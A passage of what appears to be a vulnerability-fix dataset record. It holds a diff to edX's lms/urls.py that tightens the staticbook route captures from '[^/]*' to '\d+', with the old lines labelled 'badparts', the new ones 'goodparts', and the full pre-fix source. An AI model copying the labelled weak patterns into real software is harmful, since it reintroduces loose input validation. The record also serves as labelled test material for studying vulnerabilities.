'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "add": 8, "remove": 8, "filename": "/lms/urls.py", "badparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        